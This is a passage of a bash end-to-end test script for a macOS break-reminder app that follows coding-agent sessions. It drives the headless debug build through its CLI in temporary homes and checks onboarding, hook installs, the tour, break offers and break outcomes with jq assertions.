#!/bin/bash
# End-to-end flows: the whole debug app driven through the real `breakpoint` CLI, in seconds.
#
#   scripts/e2e.sh            # all flows; prints PASS / FAIL per check and a summary; exit 1 on any FAIL
#   scripts/e2e.sh -v         # also print each flow's app trace on failure
#   scripts/e2e.sh FLOW…      # only flows whose name contains one of the words (e.g. "away call")
#
# Every run uses fresh temporary homes (BREAKPOINT_HOME under $TMPDIR, short enough for the
# socket path) and removes them at the end. Nothing touches the real home folder, the real socket
# or any coding agent's real configuration.
#
# The app runs with the debug harness (debug builds only; see CLAUDE.md, "Testing the whole app"):
#   --debug-headless   no windows, panels, status item, alerts, sounds or hotkeys; a recorder logs
#                      what would be on screen and plays the controllers' timers
#   --debug-simulate   input, calls, presence and the AirPods check are simulated; the clock moves
#                      with `breakpoint debug advance|idle|jump`
# so nothing appears on screen and nothing takes keyboard focus. Checks read the app's own state:
# `breakpoint status`, `breakpoint debug state` (JSON) and `breakpoint debug log` (the trace).
set -uo pipefail

cd "$(dirname "$0")/.."
# Host-detection variables from the shell this runs in (e.g. a Claude Code or Cursor terminal)
# would change how `emit` labels events; the flows set them explicitly where they matter.
unset CLAUDECODE CLAUDE_PROJECT_DIR CURSOR_VERSION CURSOR_PROJECT_DIR CODEX_HOME
REPO="$(pwd)"

VERBOSE=0
FILTERS=()
for arg in "$@"; do
  case "$arg" in
    -v|--verbose) VERBOSE=1 ;;
    *) FILTERS+=("$arg") ;;
  esac
done

echo "Building (debug)…"
swift build >/dev/null 2>&1 || { swift build 2>&1 | tail -20; echo "build failed"; exit 1; }
BIN="$(swift build --show-bin-path)"
APP="$BIN/BreakpointApp"
CLI="$BIN/breakpoint"
command -v jq >/dev/null || { echo "jq is required (macOS 15+ ships /usr/bin/jq)"; exit 1; }

ROOT="$(mktemp -d -t bpe2e)"
APP_PID=""
PASSED=0
FAILED=0
FAILED_NAMES=()
FLOW=""
FLOW_FAILED=0

cleanup() {
  stop_app
  rm -rf "$ROOT"
}
trap cleanup EXIT

# MARK: helpers

bp() { "$CLI" "$@"; }
state() { bp debug state; }
q() { state | jq -r "$1"; }
dbg() { bp debug "$@" >/dev/null || echo "  (debug $* failed)"; }

pass() { PASSED=$((PASSED + 1)); echo "  PASS  $1"; }
fail() {
  FAILED=$((FAILED + 1)); FLOW_FAILED=1
  FAILED_NAMES+=("$FLOW: $1")
  echo "  FAIL  $1${2:+ — $2}"
}
# expect DESCRIPTION ACTUAL EXPECTED
expect() { if [[ "$2" == "$3" ]]; then pass "$1"; else fail "$1" "got '$2', expected '$3'"; fi; }
# expect_match DESCRIPTION ACTUAL EXTENDED-REGEX
expect_match() { if [[ "$2" =~ $3 ]]; then pass "$1"; else fail "$1" "got '$2', wanted /$3/"; fi; }
# expect_true DESCRIPTION JQ-EXPRESSION (on debug state)
expect_true() { local v; v="$(q "$2")"; if [[ "$v" == "true" ]]; then pass "$1"; else fail "$1" "$2 → $v"; fi; }
expect_log() { if bp debug log | grep -qE -- "$2"; then pass "$1"; else fail "$1" "trace has no /$2/"; fi; }

wanted() {
  [[ ${#FILTERS[@]} -eq 0 ]] && return 0
  local f; for f in "${FILTERS[@]}"; do [[ "$1" == *"$f"* ]] && return 0; done
  return 1
}

stop_app() {
  if [[ -n "$APP_PID" ]] && kill -0 "$APP_PID" 2>/dev/null; then
    kill "$APP_PID" 2>/dev/null
    wait "$APP_PID" 2>/dev/null
    for _ in $(seq 1 50); do kill -0 "$APP_PID" 2>/dev/null || break; sleep 0.1; done
    kill -9 "$APP_PID" 2>/dev/null
  fi
  APP_PID=""
}

# new_home NAME [onboarded=1]: a fresh home; with onboarded=1 onboarding counts as done.
new_home() {
  export BREAKPOINT_HOME="$ROOT/$1"
  mkdir -p "$BREAKPOINT_HOME/Library/Application Support/Breakpoint"
  if [[ "${2:-1}" == 1 ]]; then
    echo '{"version":1,"hasCompletedOnboarding":true}' > "$BREAKPOINT_HOME/Library/Application Support/Breakpoint/settings.json"
  fi
}

# launch [app args…]: start the headless, simulated app on $BREAKPOINT_HOME and wait for its socket.
launch() {
  stop_app
  "$APP" --debug-headless --debug-simulate --debug-trace "$@" > "$BREAKPOINT_HOME/app.log" 2>&1 &
  APP_PID=$!
  for _ in $(seq 1 100); do
    bp status >/dev/null 2>&1 && return 0
    sleep 0.1
  done
  echo "  app did not start; log:"; sed 's/^/    /' "$BREAKPOINT_HOME/app.log" | tail -20
  return 1
}

# flow NAME HOME [onboarded]: begins a flow in a fresh home with a fresh app.
flow() {
  FLOW="$1"; FLOW_FAILED=0
  echo
  echo "== $1"
  new_home "$2" "${3:-1}"
  launch
}

end_flow() {
  if [[ $FLOW_FAILED == 1 && $VERBOSE == 1 ]]; then
    echo "  --- trace"; bp debug log | sed 's/^/    /' | tail -60
  fi
  stop_app
}

emit() { bp emit "$@"; sleep 0.15; }

sum_files() {
  # Checksums of every file under the tools' folders and rc files (paths relative to the home).
  (cd "$BREAKPOINT_HOME" && find .claude .cursor .codex .copilot .gemini .zshrc .bashrc .bash_profile .config \
     -type f 2>/dev/null | sort | while read -r f; do printf '%s %s\n' "$(shasum -a 256 "$f" | cut -c1-16)" "$f"; done
   ls -d .claude .cursor .codex .copilot .gemini .config 2>/dev/null; find . -type d -path './.c*' 2>/dev/null | sort)
}

wait_idle_integrations() {
  # An install includes its check (up to 10 s, then a few to find out why it failed).
  for _ in $(seq 1 160); do
    [[ "$(q '[.integrations[] | .busy] | any')" == "false" ]] && return 0
    sleep 0.1
  done
}

# MARK: flows

flow_launch_and_onboarding() {
  flow "launch and onboarding" launch 0
  expect_log "first launch on a clean home shows onboarding" "onboarding shown"
  expect "onboarding not yet completed" "$(q .settings.hasCompletedOnboarding)" "false"
  expect "status answers" "$(bp status | jq -r .appVersion | grep -cE '^[0-9]')" "1"
  mkdir -p "$BREAKPOINT_HOME/.claude"
  dbg action install claude-code
  wait_idle_integrations
  expect "Install from onboarding writes the hooks" "$(q '.integrations["claude-code"].state')" "installed"
  expect "the CLI copy is in place" "$([[ -x "$BREAKPOINT_HOME/.breakpoint/bin/breakpoint" ]] && echo yes)" "yes"
  # Install is the whole step: the app checks the hooks by itself and the row is Connected at once,
  # before Claude Code has sent anything.
  expect "verified at once: Connected with no event from Claude Code" "$(q '.integrations["claude-code"].status')" "connected(lastEvent: nil)"
  expect "the check's ✓ is recorded" "$(q '.integrations["claude-code"].connectedAt | type')" "string"
  expect "nothing went wrong" "$(q '.integrations["claude-code"].error')" "null"
  expect "the check is not an event from Claude Code" "$(bp status | jq '.lastEventBySource | has("claude-code")')" "false"
  expect "the check starts no session" "$(bp status | jq '.sessions | length')" "0"
  emit sessionStarted --source claude-code --session s1 --cwd /work/alpha
  expect_match "Claude Code's own events only add when it was last heard" "$(q '.integrations["claude-code"].status')" "^connected\\(lastEvent: Optional"
  # Hooks turned off in Claude Code: installed, but not shown as connected; one line says what to do.
  printf '{\n  "disableAllHooks": true\n}\n' > "$BREAKPOINT_HOME/.claude/settings.json"
  dbg action install claude-code
  wait_idle_integrations
  expect "hooks turned off in Claude Code: written, but no ✓" "$(q '.integrations["claude-code"].state')" "installed"
  expect_match "and the row says why" "$(q '.integrations["claude-code"].status')" "^problem.*disableAllHooks"
  printf '{}\n' > "$BREAKPOINT_HOME/.claude/settings.json"
  dbg action install claude-code
  wait_idle_integrations
  expect_match "turned back on, Install again connects it" "$(q '.integrations["claude-code"].status')" "^connected"
  # Hooks that cannot reach the app: no ✓, the row says what is wrong after the check times out.
  mkdir -p "$BREAKPOINT_HOME/.cursor"
  dbg install-check unreachable
  dbg action install cursor
  sleep 1
  expect "while it checks, the row is busy, not connected" "$(q '.integrations.cursor.busy'):$(q '.integrations.cursor.checking')" "true:true"
  wait_idle_integrations
  expect "an install whose check fails is written" "$(q '.integrations.cursor.state')" "installed"
  expect_match "but not connected: it says the hooks can't reach Breakpoint" "$(q '.integrations.cursor.status')" "^problem.*reach Breakpoint"
  expect "no ✓ for it" "$(q '.integrations.cursor.connectedAt')" "null"
  dbg install-check normal
  dbg action install cursor
  wait_idle_integrations
  expect_match "Install again, once the hooks reach the app, connects it" "$(q '.integrations.cursor.status')" "^connected"
  dbg action complete-onboarding
  sleep 0.3
  expect "onboarding completed and saved" "$(jq -r .hasCompletedOnboarding "$BREAKPOINT_HOME/Library/Application Support/Breakpoint/settings.json")" "true"
  expect "finishing onboarding offers the one-minute tour" "$(q .tour.step)" "offer"
  dbg tour skip
  sleep 0.2
  expect_log "Not now on the offer opens the popover, as finishing onboarding did before" "popover shown"
  end_flow
}

flow_tour() {
  # 1. First launch: onboarding ends with the offer under the mark; nothing else is on screen.
  flow "tour: offered once after onboarding" tour-offer 0
  dbg action complete-onboarding
  sleep 0.3
  expect "the offer is the tour's first card" "$(q .tour.step)" "offer"
  expect "no progress dots on the offer" "$(q .tour.progress)" "null"
  expect "remembered as offered" "$(q .settings.tourStatus)" "offered"
  expect "the popover waits for the answer" "$(bp debug log | grep -c 'popover shown')" "0"
  expect "a new user has hints on" "$(q .hints.show)" "true"
  # Some screen and still time already counted: the rehearsal must leave it alone.
  dbg timers 600 600
  dbg tour next
  expect "Take the tour → the menu-bar mark" "$(q .tour.step)" "mark"
  expect "progress 1 of 6" "$(q .tour.progress)" "1/6"
  expect "the real mark shows the sample: a break is due…" "$(q .menuBar.mark)" "due"
  expect "…while the sample agent works" "$(q .menuBar.badge)" "working"
  dbg tour next
  expect "Next → a real nudge card, marked as the rehearsal" "$(q '.nudge.rehearsal')" "true"
  expect "it offers a shortened eye rest" "$(q .nudge.title)" "15-sec eye rest?"
  expect "no hint on the sample nudge: the coach line teaches" "$(q .nudge.hint)" "null"
  expect_match "the coach line names the keycaps on its buttons" "$(q .tour.text)" "keys shown on each button"
  expect "for the sample agent" "$(q .nudge.subtitle)" "Claude is working"
  dbg advance 15
  expect "the sample nudge never times out: it waits for Start or Not now" "$(q .tour.step)" "nudge"
  dbg tour next
  expect "Next does not skip past the nudge" "$(q .tour.step)" "nudge"
  dbg action decline
  expect "Not now → what it did" "$(q .tour.step)" "declined"
  expect "the card folds away" "$(q .nudge)" "null"
  dbg tour next
  expect "Offer it again → the nudge again" "$(q .nudge.rehearsal)" "true"
  dbg action accept
  expect "Start → the real break screen, as a rehearsal" "$(q .break.rehearsal)" "true"
  expect "a few seconds long" "$(q .break.planned)" "15"
  expect_match "the agent chip says the sample agent is still working" "$(q .break.chip)" "^Claude is still working"
  expect "the mark is on a break" "$(q .menuBar.mark)" "onBreak"
  expect "no hint on the sample break" "$(q .break.hint)" "null"
  expect_match "answering the sample nudge taught it" "$(q '.hints.known | join(",")')" "^nudge$"
  dbg action skip
  expect "Skip is guarded for 3 s, as always" "$(q .tour.step)" "breakScreen"
  dbg advance 7
  expect "the chip turns: done, no rush" "$(q .break.chip)" "Claude is done. No rush."
  dbg advance 9
  expect "the sample break ends by its timer" "$(q .break)" "null"
  expect "→ the resume card, kept until the user moves on" "$(q '.cards[0].rehearsal')" "true"
  expect "it says what the sample agent did" "$(q '.cards[0].text')" "Claude finished · ran 6 min"
  expect "no hint on the sample card" "$(q '.cards[0].hint')" "null"
  dbg advance 15
  expect "the sample card does not hide itself" "$(q '.cards | length')" "1"
  dbg action dismiss resume
  expect "clicking the card away → the popover, opened for the user" "$(q .tour.step)" "popover"
  expect_log "the popover opens" "popover shown"
  expect "the popover is open" "$(q .popover.open)" "true"
  expect "no popover hint during the tour" "$(q .popover.hint)" "null"
  dbg popover menu-bar-hidden
  expect "the menu bar sliding away does not close the tour's popover" "$(q .popover.open) $(q .tour.step)" "true popover"
  for part in actions totals gear; do dbg tour next; done
  expect "its parts are named one by one" "$(q .tour.part)" "3"
  dbg popover click-outside
  expect "a click outside closes the popover → the last card" "$(q .tour.step)" "farewell"
  expect "the popover is closed" "$(q .popover.open)" "false"
  expect "by that click" "$(q .popover.closedBy)" "clickOutside"
  dbg tour next
  expect "Done ends the tour" "$(q .tour)" "null"
  expect "remembered as finished" "$(q .settings.tourStatus)" "finished"
  expect "nothing in the tour was recorded" "$(q '.history | length')" "0"
  expect "no sample surface is left" "$(q '[.nudge, .break] | map(select(. != null)) | length')" "0"
  expect "the mark is the real one again" "$(q .menuBar.badge)" "none"
  expect "the timers were not reset by the sample eye rest" "$(q '.timers.screen >= 600 and .timers.still >= 600')" "true"
  expect "the tour taught the nudge, the break and the resume card" "$(q '.hints.known | join(",")')" "nudge,break,resumeCard"
  expect "nothing else was marked known" "$(q '.hints.pending | join(",")')" "autoStart,resumeNeedsYou,popover,callPause"
  # No spacing left behind: the sample's Not now and its nudge do not hold back a real offer.
  dbg timers 1250 0
  emit agentStarted --source claude-code --session s9
  expect "a real eye rest is offered at once" "$(q '"\(.nudge.kind) \(.nudge.rehearsal)"')" "eyes false"
  dbg action decline
  launch
  dbg advance 5
  expect "never offered again after a relaunch" "$(q .tour)" "null"
  end_flow

  # 2. Updating from a version without the tour: it is never forced on existing users.
  flow "tour: existing users are not offered it after an update" tour-upgrade
  expect "no tour at launch" "$(q .tour)" "null"
  dbg advance 30
  expect "nor later" "$(q .tour)" "null"
  expect "the status reads never offered" "$(q .settings.tourStatus)" "notOffered"
  expect "no tour line in the trace" "$(bp debug log | grep -c 'tour started')" "0"
  dbg tour start
  expect "Settings → General → Take the tour starts it at the mark" "$(q .tour.step)" "mark"
  dbg tour skip
  expect "Skip tour ends it" "$(q .tour)" "null"
  expect "remembered as skipped" "$(q .settings.tourStatus)" "skipped"
  end_flow

  # 3. A call starting halfway through the sample break ends the rehearsal cleanly.
  flow "tour: a call ends it cleanly" tour-call
  dbg tour start
  dbg tour next
  dbg action accept
  dbg advance 2
  expect "on the sample break" "$(q .break.rehearsal)" "true"
  # A microphone just switched on may be dictation (§2.4): not a call yet, the rehearsal goes on.
  dbg call mic
  expect "a microphone just on does not end it" "$(q .tour.step)" "breakScreen"
  dbg call none
  # A camera counts as a call at once.
  dbg call camera
  expect "the call ends the tour" "$(q .tour)" "null"
  expect "the sample break closes" "$(q .break)" "null"
  expect "remembered as interrupted" "$(q .settings.tourStatus)" "interrupted"
  expect "nothing recorded" "$(q '.history | length')" "0"
  expect_log "the trace says why" "tour ended: interrupted \(call\)"
  launch
  expect "not replayed after a relaunch" "$(q .tour)" "null"
  end_flow

  # 4. A real break coming due ends the rehearsal and the real offer takes its place.
  flow "tour: a real break ends it" tour-real
  dbg tour start
  dbg tour next
  expect "the sample nudge shows" "$(q .nudge.rehearsal)" "true"
  dbg timers 1250 0
  emit agentStarted --source claude-code --session s1
  dbg advance 3
  expect "the tour ends" "$(q .tour)" "null"
  expect "the real offer takes the nudge's place" "$(q .nudge.rehearsal)" "false"
  expect "a real eye rest" "$(q .nudge.kind)" "eyes"
  expect_log "the trace says why" "tour ended: interrupted \(realBreak\)"
  # An agent needing the user ends a replay too.
  dbg action decline
  dbg tour start
  emit agentNeedsUser --source claude-code --session s1 --detail permission_prompt
  expect "an agent needing you ends the tour" "$(q .tour)" "null"
  expect_log "and says so" "tour ended: interrupted \(needsYou\)"
  # Pausing while the sample nudge shows withdraws it, as it would a real one, and ends the tour.
  emit agentActivity --source claude-code --session s1
  dbg tour start
  dbg tour next
  dbg action pause 30m
  expect "a pause ends the tour around the sample nudge" "$(q .tour)" "null"
  expect "and the sample nudge goes" "$(q .nudge)" "null"
  expect_log "the trace says so" "tour ended: interrupted \(paused\)"
  end_flow
}

flow_sessions() {
  flow "agent sessions" sessions
  emit sessionStarted --source claude-code --session s1 --cwd /work/alpha
  expect "sessionStarted → idle session" "$(bp status | jq -r '.sessions[0].state')" "idle"
  emit agentStarted --source claude-code --session s1 --cwd /work/alpha --title "fix the login redirect"
  expect "agentStarted → working" "$(bp status | jq -r '.sessions[0].state')" "working"
  expect "no offer when no break is due" "$(q .nudge)" "null"
  expect "menu bar shows the working badge" "$(q .menuBar.badge)" "working"
  emit agentNeedsUser --source claude-code --session s1 --detail permission_prompt
  expect "agentNeedsUser → waiting" "$(bp status | jq -r '.sessions[0].state')" "waiting"
  expect "menu bar shows the needs-you badge" "$(q .menuBar.badge)" "needsYou"
  emit agentActivity --source claude-code --session s1
  expect "agentActivity after approval → working" "$(bp status | jq -r '.sessions[0].state')" "working"
  dbg advance 95
  emit agentFinished --source claude-code --session s1
  expect "agentFinished → idle" "$(bp status | jq -r '.sessions[0].state')" "idle"
  expect_match "the run is recorded for the estimate" "$(q '.expectedRun["claude-code"] // 0')" "^9[0-9]"
  emit agentStarted --source claude-code --session s1
  emit agentFinished --source claude-code --session s1 --detail error
  emit agentStarted --source claude-code --session s1
  emit agentFinished --source claude-code --session s1 --detail interrupted
  expect_match "error and interrupted runs are not recorded" "$(q '.expectedRun["claude-code"]')" "^9[0-9]"
  emit agentNeedsUser --source claude-code --session s1 --detail idle_prompt
  expect "idle_prompt on an idle session is ignored" "$(bp status | jq -r '.sessions[0].state')" "idle"
  # Several tools at once.
  emit agentStarted --source codex --session c1 --cwd /work/beta
  emit agentStarted --source copilot --session p1 --cwd /work/gamma
  emit agentStarted --source gemini --session g1 --cwd /work/delta
  expect "four tools tracked at once" "$(bp status | jq '.sessions | length')" "4"
  expect "three working" "$(bp status | jq '[.sessions[] | select(.state=="working")] | length')" "3"
  dbg action start eyes
  expect "the break's agent chip counts the working agents" "$(q .break.chip)" "3 agents working"
  dbg advance 21
  emit sessionEnded --source codex --session c1
  expect "sessionEnded removes the session" "$(bp status | jq '[.sessions[] | select(.source=="codex")] | length')" "0"
  expect "status lists last events per source" "$(bp status | jq '.lastEventBySource | keys | length')" "4"
  end_flow
}

flow_offers() {
  flow "offers at the right moments" offers
  emit agentStarted --source claude-code --session s1 --cwd /work/alpha
  expect "not due: no offer" "$(q .nudge)" "null"
  emit agentFinished --source claude-code --session s1
  dbg timers 1250 3050
  dbg input key
  emit agentStarted --source claude-code --session s1 --title "add tests"
  expect "typing: the opportunity is held" "$(q .held)" "agentStarted"
  expect "typing: no offer yet" "$(q .nudge)" "null"
  dbg advance 3
  expect "≈2 s after the last key: the offer appears" "$(q .nudge.kind)" "move"
  expect "offer names kind and length" "$(q .nudge.title)" "2-min stretch?"
  expect "subtitle says the agent is working" "$(q .nudge.subtitle)" "Claude is working"
  expect "menu bar shows break due" "$(q .menuBar.mark)" "due"
  dbg advance 11
  expect "offer ignored after 10 s" "$(q .nudge)" "null"
  expect "ignored is recorded" "$(q '.history[-1].outcome')" "ignored"
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "nudge spacing: no second offer at once" "$(q .nudge)" "null"
  dbg advance 290
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "nudge spacing: still no second offer 5 min later" "$(q .nudge)" "null"
  # 10 min after the first nudge; the stretch stays kind-spaced until 10 min after it was ignored.
  dbg advance 300
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "after 10 min of spacing: the eye rest (move is kind-spaced a few seconds longer)" "$(q .nudge.kind)" "eyes"
  expect "eye rest starts by itself (auto-start card)" "$(q .nudge.phase)" "autoStartCard"
  dbg input key
  expect "a key press cancels auto-start back to an offer" "$(q .nudge.phase)" "offer"
  dbg action decline
  expect "Not now is recorded as declined" "$(q '.history[-1].outcome')" "declined"
  # Strict mode: no typingPause offers.
  dbg settings '{"strictAgentOnly": true}'
  dbg timers 2000 100
  dbg advance 700
  expect "strict mode: a long typing pause offers nothing" "$(q '[.history[] | select(.opportunity=="typingPause")] | length')" "0"
  dbg settings '{"strictAgentOnly": false}'
  dbg advance 2
  expect "typing pause at 1.5× the cadence offers the eye rest" "$(q '"\(.nudge.kind) \(.nudge.opportunity)"')" "eyes typingPause"
  dbg advance 12
  expect "untouched, the eye rest starts by itself" "$(q '"\(.break.kind) \(.nudge)"')" "eyes null"
  end_flow
}

flow_breaks() {
  flow "break lifecycle" breaks
  # Midday, so the 05:00 day boundary never falls inside this flow ("breaks taken today" below
  # failed when the script ran shortly before 05:00).
  dbg jump 12:00
  dbg timers 1250 3050
  emit agentStarted --source claude-code --session s1 --cwd /work/alpha
  dbg action accept
  expect "Start opens the stretch" "$(q .break.kind)" "move"
  expect "routine step shown" "$(q .break.step)" "1/4"
  expect "menu bar shows on a break" "$(q .menuBar.mark)" "onBreak"
  dbg action extend
  expect "1 more minute extends the break" "$(q .break.planned)" "180"
  dbg action step 1
  expect_match "→ moves to the next step (the extension replayed two)" "$(q .break.step)" "^2/6$"
  dbg action skip
  expect "Skip does nothing during the 3 s guard" "$(q .break.kind)" "move"
  dbg advance 3
  dbg action skip
  expect "Skip after the guard ends the break" "$(q .break)" "null"
  expect "a started break is never a refusal: endedEarly" "$(q '.history[-1].outcome')" "endedEarly"
  dbg advance 301
  dbg action start eyes
  dbg advance 17
  expect "Done appears at 80%" "$(q .break.done)" "true"
  dbg advance 4
  expect "the timer reaching 0 ends the eye rest" "$(q .break)" "null"
  expect "completed is recorded" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "eyes completed"
  expect "eye timer reset" "$(q '.timers.screen < 10')" "true"
  dbg action start breathe
  dbg advance 61
  expect "breathe completes" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "breathe completed"
  dbg action start move
  dbg advance 121
  expect "the stretch completes" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "move completed"
  expect "completing move resets both timers" "$(q '.timers.still < 10 and .timers.screen < 10')" "true"
  expect "history summarised: breaks taken today" "$(q .today.breaksTaken)" "4"
  dbg action preview-break eyes
  expect "a Settings preview shows the break" "$(q .break.preview)" "true"
  sleep 0.1; dbg advance 6
  expect "previews end by themselves and record nothing" "$(q '[.break, (.history | length)] | @json')" "[null,4]"
  end_flow
}

flow_walk() {
  flow "walk and needs you" walk
  # A 9-minute run makes Claude's expected run long enough for a walk (threshold 8 min).
  emit agentStarted --source claude-code --session s1 --cwd /work/alpha
  dbg advance 540
  emit agentFinished --source claude-code --session s1
  dbg timers 1250 3050
  emit agentStarted --source claude-code --session s1
  expect "a long expected run offers a walk" "$(q .nudge.title)" "9-min walk?"
  dbg action accept
  expect "walk overlay" "$(q .break.kind)" "walk"
  expect_match "walk promises a chime" "$(q .break.instruction)" "chime (when|if) (Claude|it) needs you"
  expect "walk primary is I'm back" "$(q .break.primary)" "I'm back"
  dbg idle 31
  expect "30 s without input: ambient" "$(q .break.ambient)" "true"
  emit agentNeedsUser --source claude-code --session s1 --detail permission_prompt
  expect "needs you during the break: chip" "$(q .break.chip)" "Claude needs you"
  expect "the chime plays once" "$(q '.sounds | map(select(.=="needsYouChime")) | length')" "1"
  expect "primary becomes Back to work" "$(q .break.primary)" "Back to work"
  expect "the instruction no longer promises a chime" "$(q .break.instruction)" "Claude needs you. Head back when you're ready."
  expect "needs you wakes the ambient screen" "$(q .break.ambient)" "false"
  emit agentNeedsUser --source claude-code --session s1 --detail permission_prompt
  expect "no second chime" "$(q '.sounds | map(select(.=="needsYouChime")) | length')" "1"
  dbg action finish backToWork
  expect "Back to work before 80%: endedEarly" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "walk endedEarly"
  expect "the needs-you resume card follows" "$(q '.cards[0].text')" "Claude needs you"
  dbg advance 15
  expect "a needs-you card stays until dismissed" "$(q '.cards | length')" "1"
  dbg action dismiss all
  # Finished during a break → resume card that hides itself.
  emit agentActivity --source claude-code --session s1
  dbg advance 301
  dbg action start eyes
  emit agentFinished --source claude-code --session s1
  expect "chip says done" "$(q .break.chip)" "Claude is done. No rush."
  dbg advance 21
  expect_match "resume card after the break" "$(q '.cards[0].text')" "^Claude finished"
  dbg advance 11
  expect "resume card hides itself after 10 s" "$(q '.cards | length')" "0"
  end_flow
}

flow_walk_ended_early() {
  flow "a walk ended early still counts as moving" walk-early
  dbg jump 12:00
  # A reported case: 14 min still, Take a break ▸ Walk, 90 s away from the keys, I'm back.
  dbg timers 600 870
  dbg action start walk
  expect "a walk with no agent aims for 5 min" "$(q .break.planned)" "300"
  dbg idle 90
  expect "the walk does not make you away before the threshold" "$(q .presence)" "present"
  dbg input pointer
  dbg action finish imBack
  expect "I'm back after 90 s records endedEarly" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "walk endedEarly"
  expect "both timers restart when the walk ends" "$(q '.timers.still < 2 and .timers.screen < 2')" "true"
  dbg advance 120
  expect_match "“since you moved” counts from the end of the walk" "$(q .timers.still)" "^(119|120|121)$"
  # Skip (or esc esc) on a walk is not a refusal.
  dbg timers 600 3100
  dbg action start walk
  dbg idle 75
  dbg action skip
  expect "Skip records endedEarly" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "walk endedEarly"
  expect "and still time restarts" "$(q '.timers.still < 2')" "true"
  # A stretch counts however soon it ends: at 5 s, or at 30 s, both timers restart.
  dbg timers 600 1200
  dbg action start move
  dbg advance 5
  dbg action skip
  expect "Skip at 5 s records endedEarly" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "move endedEarly"
  expect "and both timers restart" "$(q '.timers.still < 2 and .timers.screen < 2')" "true"
  dbg timers 600 1200
  dbg action start move
  dbg advance 30
  dbg action skip
  expect "a stretch stopped at 30 s records endedEarly" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "move endedEarly"
  expect "and both timers restart" "$(q '.timers.still < 2 and .timers.screen < 2')" "true"
  dbg timers 600 1230
  # A breather is done sitting down: still time carries on.
  dbg action start breathe
  dbg advance 61
  expect "breathe completes" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "breathe completed"
  expect "a breather does not count as moving" "$(q '.timers.still >= 1260')" "true"
  end_flow
}

flow_counted() {
  flow "a break you started counts, however it ends" counted
  dbg jump 12:00
  # Agent runs only (no typing-pause offers in the long advances below); eye rests wait for Start.
  dbg settings '{"strictAgentOnly": true, "autoStartEyes": false}'
  dbg timers 1250 600
  emit agentStarted --source claude-code --session s1
  expect "an eye rest is offered" "$(q .nudge.kind)" "eyes"
  dbg action accept
  dbg advance 12
  dbg action skip
  expect "an eye rest skipped at 12 s records endedEarly, not skipped" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "eyes endedEarly"
  expect "screen time restarts" "$(q '.timers.screen < 2')" "true"
  expect "it counts as an eye rest" "$(q .totals.eyeRests)" "1"
  dbg advance 610
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "ten minutes on it is not offered again as a refusal" "$(q .nudge)" "null"
  expect_match "nothing is due: screen time counts from the end of the eye rest" "$(q .whyNotNow)" "^Nothing due: eye rest in (9|10) min"
  # Skipped as soon as Skip works (3 s): it still counts.
  dbg timers 1250 600
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "offered again once due" "$(q .nudge.kind)" "eyes"
  dbg action accept
  dbg advance 3
  dbg action skip
  expect "skipped at 3 s: endedEarly" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "eyes endedEarly"
  expect "screen time restarts" "$(q '.timers.screen < 2')" "true"
  expect "two eye rests in the totals" "$(q .totals.eyeRests)" "2"
  expect "nothing is recorded as skipped" "$(q '[.history[] | select(.outcome == "skipped")] | length')" "0"
  # Not now: the next offer waits 10 min from this one.
  dbg advance 601
  dbg timers 600 3050
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "a stretch is offered" "$(q .nudge.kind)" "move"
  dbg action decline
  dbg timers 1250 3050
  dbg advance 300
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "5 min after an offer: no second offer" "$(q .nudge)" "null"
  dbg advance 290
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "just under 10 min: still none" "$(q .nudge)" "null"
  dbg advance 15
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "10 min after the first: the next offer (the turned-down stretch, its own 10 min over)" "$(q .nudge.kind)" "move"
  dbg action decline
  # A breather restarts nothing, but holds off the stretch for a whole cadence (50 min).
  dbg action start breathe
  dbg advance 30
  dbg action skip
  expect "a breather left at 30 s counts" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "breathe endedEarly"
  expect "still time carries on (a breather is done sitting down)" "$(q '.timers.still >= 3050')" "true"
  expect "the stretch is held" "$(q '.stretchHeldUntil != null')" "true"
  dbg timers 0 3100
  dbg advance 610
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "10 min after the breather: no stretch" "$(q .nudge)" "null"
  expect_match "why not now names the breather" "$(q .whyNotNow)" "^You took a breather: next stretch from [0-9]{1,2}:[0-9]{2}"
  expect "the menu bar does not show a stretch due during the hold" "$(q .menuBar.mark)" "idle"
  dbg advance 600
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "an eye rest still comes when due" "$(q .nudge.kind)" "eyes"
  dbg action accept
  dbg advance 21
  dbg advance 1750
  dbg timers 0 6000
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "just before a cadence has passed: still no stretch" "$(q .nudge)" "null"
  dbg advance 25
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "a cadence after the breather: the stretch again" "$(q .nudge.kind)" "move"
  end_flow
}

flow_saying_no() {
  flow "saying no again and again: asked once per cadence" saying_no
  dbg jump 12:00
  # Agent runs only, and screen time kept at 0 below, so only the still-time slot is offered.
  dbg settings '{"strictAgentOnly": true, "autoStartEyes": false}'
  prompt() { emit agentFinished --source claude-code --session s1; emit agentStarted --source claude-code --session s1; }
  dbg timers 0 3050
  prompt
  expect "a stretch is offered" "$(q .nudge.kind)" "move"
  dbg action decline
  dbg advance 601
  dbg timers 0 3700
  prompt
  expect "ten minutes on: the stretch again" "$(q .nudge.kind)" "move"
  dbg action decline
  dbg advance 601
  dbg timers 0 4300
  prompt
